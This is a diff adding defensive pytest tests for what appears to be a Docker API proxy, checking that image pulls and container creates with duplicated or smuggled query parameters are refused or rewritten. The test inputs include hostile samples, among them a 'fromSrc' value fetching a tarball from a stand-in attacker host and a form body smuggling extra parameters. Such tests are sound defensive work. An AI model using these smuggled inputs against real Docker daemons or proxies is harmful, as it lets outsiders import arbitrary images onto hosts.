@@ -32,6 +32,9 @@ class FakeDocker:
         }
         self.host_configs = {"team2-instance-9": {"Binds": ["/opt/team2/data/x:/x:rw"]}}
         self.seen: list[tuple[str, str, bytes]] = []
+        # Per path: the query and Content-Type it last arrived with.
+        self.queries: dict[str, str] = {}
+        self.content_types: dict[str, str | None] = {}
         self.down = False
 
     def __call__(self, request: httpx.Request) -> httpx.Response:
@@ -39,6 +42,8 @@ class FakeDocker:
             raise httpx.ConnectError("no daemon")
         path = request.url.path
         self.seen.append((request.method, path, request.content))
+        self.queries[path] = request.url.query.decode()
+        self.content_types[path] = request.headers.get("content-type")
         if path.endswith("/containers/json"):
             return httpx.Response(200, json=[
                 {"Id": name, "Names": [f"/{name}"], "Labels": labels}
@@ -262,3 +267,63 @@ def test_docker_down_is_a_502(gate):
     fake.down = True
     resp = client.get(f"{V}/containers/json")
     assert resp.status_code == 502
+
+
+# --------------------------------------------------------------------------- #
+# Query strings are read once and rewritten (security review 2026-10-20, F1)
+# --------------------------------------------------------------------------- #
+@pytest.mark.parametrize("query", [
+    # Docker takes the first value, blank included: this was an image IMPORT.
+    "fromImage=&fromImage=steamcmd/steamcmd&tag=latest",
+    "fromImage=steamcmd/steamcmd&fromImage=alpine&tag=latest",
+    "fromImage=steamcmd/steamcmd&tag=latest&fromSrc=-&repo=steamcmd/steamcmd",
+    "fromImage=steamcmd/steamcmd&tag=latest&fromSrc=http://evil.example/x.tar",
+    "fromImage=steamcmd/steamcmd&tag=latest&message=x",
+    "fromImage=&tag=latest",
+])
+def test_a_pull_that_could_be_an_import_is_refused(gate, query):
+    client, fake = gate
+    resp = client.post(f"{V}/images/create?{query}")
+    assert resp.status_code == 403
+    assert not fake.asked("POST", "/images/create")
+
+
+def test_a_pull_is_forwarded_with_the_gates_own_query_and_no_body(gate):
+    client, fake = gate
+    # A form-encoded body is read by Docker as more query parameters.
+    resp = client.post(f"{V}/images/create?fromImage=steamcmd/steamcmd&tag=latest",
+                       content=b"fromImage=&fromSrc=http://evil.example/x.tar",
+                       headers={"content-type": "application/x-www-form-urlencoded"})
+    assert resp.status_code == 200
+    path = f"{V}/images/create"
+    assert fake.queries[path] == "fromImage=steamcmd%2Fsteamcmd&tag=latest"
+    assert next(c for m, p, c in fake.seen if p == path) == b""
+    assert fake.content_types[path] is None
+
+
+def test_a_pull_always_names_its_tag(gate):
+    # Without one, Docker pulls every tag of the repository.
+    client, fake = gate
+    assert client.post(f"{V}/images/create?fromImage=steamcmd/steamcmd").status_code == 200
+    assert fake.queries[f"{V}/images/create"] == "fromImage=steamcmd%2Fsteamcmd&tag=latest"
+    assert client.post(f"{V}/images/create?fromImage=steamcmd/steamcmd:latest").status_code == 200
+    assert fake.queries[f"{V}/images/create"] == "fromImage=steamcmd%2Fsteamcmd&tag=latest"
+
+
+@pytest.mark.parametrize("query", [
+    "name=&name=team2-instance-2",       # Docker would take the blank: a random name
+    "name=team2-instance-2&name=evil",
+    "name=team2-instance-2&other=1",
+])
+def test_a_create_with_an_ambiguous_query_is_refused(gate, query):
+    client, fake = gate
+    resp = client.post(f"{V}/containers/create?{query}", json={"Image": HELPER})
+    assert resp.status_code == 403
+    assert not fake.asked("POST", "/containers/create")
+
+
+def test_a_create_is_forwarded_with_the_gates_own_query(gate):
+    client, fake = gate
+    resp = client.post(f"{V}/containers/create?name=team2-steamcmd-1", json={"Image": HELPER})
+    assert resp.status_code == 201
+    assert fake.queries[f"{V}/containers/create"] == "name=team2-steamcmd-1"
